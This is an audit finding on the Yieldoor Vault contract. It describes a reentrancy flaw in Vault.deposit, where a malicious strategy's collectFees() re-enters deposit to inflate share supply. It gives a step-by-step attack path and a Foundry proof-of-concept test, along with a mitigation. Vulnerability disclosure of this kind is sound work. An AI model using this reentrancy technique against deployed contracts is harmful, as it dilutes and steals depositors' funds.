# Malicious actor will inflate share supply for depositors

### Summary

The missing nonReentrant protection in Vault.deposit will cause a critical share inflation for depositors as a malicious actor will reenter the deposit function via a compromised strategy.

### Root Cause

In `Vault.sol:52`, calling `strategy.collectFees()` before updating internal state enables reentrancy.

https://github.com/sherlock-audit/2025-02-yieldoor/blob/b5a0f779dce4236b02665606adb610099451a51a/yieldoor/src/Vault.sol#L52

### Internal Pre-conditions

 1. Vault.deposit is executed without reentrancy protection.
 2. Internal state (share minting) is updated only after the external call to `strategy.collectFees()`.

### External Pre-conditions

 1. Malicious strategy is set as the Vault's strategy.
 2. The attacker can trigger a reentrant deposit during fee collection.

### Attack Path

1. The attacker deploys a malicious strategy that, in its `collectFees()` function, calls `vault.deposit(2 ether, 2 ether, 0, 0)`.
2. The attacker sets this malicious strategy as the Vault’s strategy.
3. A legitimate user (or the attacker) calls `Vault.deposit(100 ether, 100 ether, 90 ether, 90 ether)`.
4. During deposit, Vault calls `strategy.collectFees()`, triggering the malicious strategy’s reentrant call.
5. Extra shares are minted during the reentrant deposit, inflating the total share supply.

### Impact

The legitimate depositors suffer as the share supply inflates, leading to diluting their stakes and incorrect fund accounting.

contract VaultReentrancyTest is Test {
    ERC20Mock public token0;
    ERC20Mock public token1;
    Vault public vault;
    MaliciousStrategy public maliciousStrategy;
    address public owner;

    function setUp() public {
        owner = address(this);

        token0 = new ERC20Mock("Token 0", "TK0", 1000 ether);
        token1 = new ERC20Mock("Token 1", "TK1", 1000 ether);

        vault = new Vault(address(token0), address(token1));

        maliciousStrategy = new MaliciousStrategy(address(vault));
        vault.setStrategy(address(maliciousStrategy));

        token0.approve(address(vault), 1000 ether);
        token1.approve(address(vault), 1000 ether);

        token0.transfer(address(maliciousStrategy), 2 ether);
        token1.transfer(address(maliciousStrategy), 2 ether);

        vm.prank(address(maliciousStrategy));
        maliciousStrategy.approveVault(address(token0), address(token1), address(vault), 500 ether);
    }

    function testReentrancyInDeposit() public {
        uint256 maliciousBalanceBefore = vault.balanceOf(address(maliciousStrategy));

        uint256 amount0 = 100 ether;
        uint256 amount1 = 100 ether;
        uint256 amount0Min = 90 ether;
        uint256 amount1Min = 90 ether;

        (uint256 shares, uint256 depositAmount0, uint256 depositAmount1) = vault.deposit(amount0, amount1, amount0Min, amount1Min);

        uint256 maliciousBalanceAfter = vault.balanceOf(address(maliciousStrategy));

        assertGt(
            maliciousBalanceAfter,
            maliciousBalanceBefore,
            "Reentrancy did not result in extra shares for the malicious strategy"
        );


        uint256 totalSupply = vault.totalSupply();
        assertGt(
            totalSupply,
            shares,
            "Total share supply not inflated by reentrant deposit"
        );
    }
}

### Mitigation

Apply nonReentrant protection and ensure state updates occur before external calls in Vault.deposit/withdraw.
